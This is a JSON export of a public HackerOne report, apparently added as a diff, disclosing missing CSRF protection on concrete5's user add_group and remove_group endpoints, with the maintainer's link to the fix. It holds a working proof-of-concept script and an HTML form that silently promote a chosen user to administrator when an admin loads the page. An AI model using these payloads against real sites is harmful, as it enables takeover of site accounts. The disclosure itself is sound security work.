@@ -1,0 +1,260 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2015-07-27T20:03:11.992Z", 
+    "voters": [], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 64184, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "activity_page_count": 1, 
+    "activity_page_number": 1, 
+    "title": "No csrf protection on index.php/ccm/system/user/add_group, index.php/ccm/system/user/remove_group", 
+    "is_member_of_team?": null, 
+    "vote_count": 0, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 158, 
+            "content": "`add_group` and `remove_group` have no CSRF protection.", 
+            "content_html": "<p><code>add_group</code> and <code>remove_group</code> have no CSRF protection.</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2015-08-26T20:03:12.371Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2015-05-29T12:34:58.383Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-05-29T12:34:58.383Z", 
+            "actor": {
+                "username": "jmpalk", 
+                "url": "/jmpalk", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "message": "I was in a hurry yesterday, and decided overnight I could clean up the report and POC. See below.\nCrayons\n\nThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group.\n\nConsequently, an attacker could craft a malicious POST request that will add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site. This includes adding members to the administrator group, giving the attacker full control of the site.\n\nPossibly exploitable from outside the site, this can definitely be triggered from any page where the attacker has write access to the SEO information on the page.\n\nPOC\n\nAs an administrator, create a new blog page in concrete5, and give write access/edit permission to another, non-administrator, user.\n\nIn the \"Extra Header Content\" section of the page's SEO module, add the following javascript:\n\n<!-- \n<script language=\"JavaScript\" type=\"text/javascript\">\n\nwindow.onload = promoteUser();\n\n function promoteUser() {\n   var XHR = new XMLHttpRequest();\n   var urlEncodedData = \"\";\n   var urlEncodedDataPairs = [];\n   var name;\n   var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote\n\n   for(name in data) {\n     urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));\n   } //end for(name in data)\n\n   urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');\n\n   XHR.addEventListener('load', function(event){\n     //alert boxes for testing purposes only\n     //alert('Yeah! Data sent and response loaded.');\n     });\n\n   XHR.addEventListener('error', function(event){\n     //alert boxes for testing purposes only\n     //alert('Oops. Something went wrong.');\n     });\n\n   XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/add_group');\n\n   XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n   XHR.setRequestHeader('Content-Length', urlEncodedData.length);\n\n   XHR.send(urlEncodedData);\n\n }//end promoteUser\n\n</script>\n\n-->\n\nAs the non administrator user, save and publish the page\n\nAs the administrator, browse to the new blog page. \n\nThe non-privileged user should now have administrator privileges the next time s/he logs in.\n\nThe same attack can be used to remove a user from a group by substituting 'remove_group' for 'add_group' in the XHR.open statement in the JS above.", 
+            "markdown_message": "<p>I was in a hurry yesterday, and decided overnight I could clean up the report and POC. See below.<br>\nCrayons</p>\n\n<p>There is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group.</p>\n\n<p>Consequently, an attacker could craft a malicious POST request that will add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site. This includes adding members to the administrator group, giving the attacker full control of the site.</p>\n\n<p>Possibly exploitable from outside the site, this can definitely be triggered from any page where the attacker has write access to the SEO information on the page.</p>\n\n<p>POC</p>\n\n<p>As an administrator, create a new blog page in concrete5, and give write access/edit permission to another, non-administrator, user.</p>\n\n<p>In the &quot;Extra Header Content&quot; section of the page&#39;s SEO module, add the following javascript:</p>\n\n<p>&lt;!-- <br>\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;</p>\n\n<p>window.onload = promoteUser();</p>\n\n<p>function promoteUser() {<br>\n   var XHR = new XMLHttpRequest();<br>\n   var urlEncodedData = &quot;&quot;;<br>\n   var urlEncodedDataPairs = [];<br>\n   var name;<br>\n   var data = {gID:&#39;3&#39;, uID:&#39;8&#39;}; //sub uID for whatever uID you want to promote</p>\n\n<p>for(name in data) {<br>\n     urlEncodedDataPairs.push(encodeURIComponent(name) + &#39;=&#39; + encodeURIComponent(data[name]));<br>\n   } //end for(name in data)</p>\n\n<p>urlEncodedData = urlEncodedDataPairs.join(&#39;&amp;&#39;).replace(/%20/g, &#39;+&#39;);</p>\n\n<p>XHR.addEventListener(&#39;load&#39;, function(event){<br>\n     //alert boxes for testing purposes only<br>\n     //alert(&#39;Yeah! Data sent and response loaded.&#39;);<br>\n     });</p>\n\n<p>XHR.addEventListener(&#39;error&#39;, function(event){<br>\n     //alert boxes for testing purposes only<br>\n     //alert(&#39;Oops. Something went wrong.&#39;);<br>\n     });</p>\n\n<p>XHR.open(&#39;POST&#39;, &#39;http://&lt;&lt;site&gt;&gt;/concrete5/index.php/ccm/system/user/add_group&#39;);</p>\n\n<p>XHR.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);<br>\n   XHR.setRequestHeader(&#39;Content-Length&#39;, urlEncodedData.length);</p>\n\n<p>XHR.send(urlEncodedData);</p>\n\n<p>}//end promoteUser</p>\n\n<p>&lt;/script&gt;</p>\n\n<p>--&gt;</p>\n\n<p>As the non administrator user, save and publish the page</p>\n\n<p>As the administrator, browse to the new blog page. </p>\n\n<p>The non-privileged user should now have administrator privileges the next time s/he logs in.</p>\n\n<p>The same attack can be used to remove a user from a group by substituting &#39;remove_group&#39; for &#39;add_group&#39; in the XHR.open statement in the JS above.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 431903, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-06-04T02:11:14.297Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-06-04T02:11:14.297Z", 
+            "actor": {
+                "username": "jmpalk", 
+                "url": "/jmpalk", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "message": "This could also be exploited via an HTML form on an external site. For example:\n\n\n\n     <form action=\"http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group\" method=\"post\">\n\n      <input type=\"hidden\" name=\"gID\" value=\"3\" />\n      <input type=\"hidden\" name=\"uID\" value=\"6\" />\n\n      <button type=\"submit\">Csrf your site here!</button>\n\n    </form> \n", 
+            "markdown_message": "<p>This could also be exploited via an HTML form on an external site. For example:</p>\n<pre class=\"highlight plaintext\"><code> &lt;form action=&quot;http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group&quot; method=&quot;post&quot;&gt;\n\n  &lt;input type=&quot;hidden&quot; name=&quot;gID&quot; value=&quot;3&quot; /&gt;\n  &lt;input type=&quot;hidden&quot; name=&quot;uID&quot; value=&quot;6&quot; /&gt;\n\n  &lt;button type=&quot;submit&quot;&gt;Csrf your site here!&lt;/button&gt;\n\n&lt;/form&gt; \n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 440173, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-06-17T17:02:26.248Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-06-17T17:02:26.248Z", 
+            "actor": {
+                "username": "korvin", 
+                "url": "/korvin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/454/9a0e6f861d861e27945d02c73b3598bb6abb5bff_medium.jpg?1406656654"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "message": "My apologies for this sitting, I'm looking into this now.", 
+            "markdown_message": "<p>My apologies for this sitting, I&#39;m looking into this now.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 475436, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "jmpalk", 
+                "url": "/jmpalk"
+            }, 
+            "created_at": "2015-06-17T17:28:39.577Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-06-17T17:28:39.577Z", 
+            "actor": {
+                "username": "korvin", 
+                "url": "/korvin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/454/9a0e6f861d861e27945d02c73b3598bb6abb5bff_medium.jpg?1406656654"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "message": "https://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685", 
+            "markdown_message": "<p><a title=\"https://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685\" href=\"/redirect?signature=615921e0ab49fd597fc5a243ff0a5fce9ebbb1f5&amp;url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fcommit%2F303c51bfffcdcc04f01f1b8c2ee23efd925ef685\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 475478, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-07-27T20:03:12.115Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-07-27T20:03:12.115Z", 
+            "actor": {
+                "username": "jmpalk", 
+                "url": "/jmpalk", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 527509, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-08-26T20:03:23.252Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-08-26T20:03:23.252Z", 
+            "actor": {
+                "url": "/concrete5", 
+                "profile": {
+                    "name": "concrete5"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/060/80201c838134b35b9b1acd99ad8a7a7c214aa374_medium.jpg?1393279055"
+                }
+            }, 
+            "team_handle": "concrete5", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 564660, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "jmpalk", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/jmpalk", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 45, 
+        "name": "Cross-Site Request Forgery (CSRF)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -103517777.20593657, 
+    "disclosed_at": "2015-08-26T20:03:22.151Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/64184", 
+    "created_at": "2015-05-28T17:58:01.319Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>crayons</p>\n\n<p>There is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. </p>\n\n<p>A malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.</p>\n\n<p>For example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the &quot;Extra Header Content&quot; section of the page&#39;s SEO module:</p>\n\n<p>&lt;!-- <br>\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;</p>\n<pre class=\"highlight plaintext\"><code> window.onload = promoteUser();\n\n function promoteUser() {\n   var XHR = new XMLHttpRequest();\n   var urlEncodedData = &quot;&quot;;\n   var urlEncodedDataPairs = [];\n   var name;\n   var data = {gID:&#39;3&#39;, uID:&#39;8&#39;}; //sub uID for whatever uID you want to promote\n\n   for(name in data) {\n     urlEncodedDataPairs.push(encodeURIComponent(name) + &#39;=&#39; + encodeURIComponent(data[name]));\n   } //end for(name in data)\n\n   urlEncodedData = urlEncodedDataPairs.join(&#39;&amp;&#39;).replace(/%20/g, &#39;+&#39;);\n\n   XHR.addEventListener(&#39;load&#39;, function(event){\n     //alert boxes for testing purposes only\n     //alert(&#39;Yeah! Data sent and response loaded.&#39;);\n     });\n\n   XHR.addEventListener(&#39;error&#39;, function(event){\n     //alert boxes for testing purposes only\n     //alert(&#39;Oops. Something went wrong.&#39;);\n     });\n\n   XHR.open(&#39;POST&#39;, &#39;http://&lt;&lt;site&gt;&gt;/concrete5/index.php/ccm/system/user/add_group&#39;);\n</code></pre>\n<p>// alt:  XHR.open(&#39;POST&#39;, // &#39;http://&lt;&lt;site&gt;&gt;/concrete5/index.php/ccm/system/user/remove_group&#39;);</p>\n<pre class=\"highlight plaintext\"><code>   XHR.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);\n   XHR.setRequestHeader(&#39;Content-Length&#39;, urlEncodedData.length);\n\n   XHR.send(urlEncodedData);\n\n }//end promoteUser\n</code></pre>\n<p>&lt;/script&gt;</p>\n\n<p>--&gt;</p>\n\n<p>As an aside, I&#39;m not sure whether allowing any user to add javascript to the &quot;Extra Header Content&quot; field of a page&#39;s SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.</p>\n", 
+    "vulnerability_information": "crayons\r\n\r\nThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. \r\n\r\n\r\n\r\nA malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.\r\n\r\nFor example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the \"Extra Header Content\" section of the page's SEO module:\r\n\r\n<!-- \r\n<script language=\"JavaScript\" type=\"text/javascript\">\r\n \r\n     window.onload = promoteUser();\r\n \r\n     function promoteUser() {\r\n       var XHR = new XMLHttpRequest();\r\n       var urlEncodedData = \"\";\r\n       var urlEncodedDataPairs = [];\r\n       var name;\r\n       var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote\r\n \r\n       for(name in data) {\r\n         urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));\r\n       } //end for(name in data)\r\n \r\n       urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');\r\n \r\n       XHR.addEventListener('load', function(event){\r\n         //alert boxes for testing purposes only\r\n         //alert('Yeah! Data sent and response loaded.');\r\n         });\r\n \r\n       XHR.addEventListener('error', function(event){\r\n         //alert boxes for testing purposes only\r\n         //alert('Oops. Something went wrong.');\r\n         });\r\n \r\n       XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/add_group');\r\n// alt:  XHR.open('POST', // 'http://<<site>>/concrete5/index.php/ccm/system/user/remove_group');\r\n\r\n       XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\r\n       XHR.setRequestHeader('Content-Length', urlEncodedData.length);\r\n \r\n       XHR.send(urlEncodedData);\r\n \r\n     }//end promoteUser\r\n</script>\r\n\r\n-->\r\n\r\nAs an aside, I'm not sure whether allowing any user to add javascript to the \"Extra Header Content\" field of a page's SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.concrete5.org", 
+            "about": "A simple and powerful content management system.", 
+            "twitter_handle": "concrete5", 
+            "name": "concrete5"
+        }, 
+        "handle": "concrete5", 
+        "url": "https://hackerone.com/concrete5", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/060/622f9171a70969f5b0edaf2c826c92ea6e022fb3_small.jpg?1393279055", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/060/80201c838134b35b9b1acd99ad8a7a7c214aa374_medium.jpg?1393279055"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 60, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
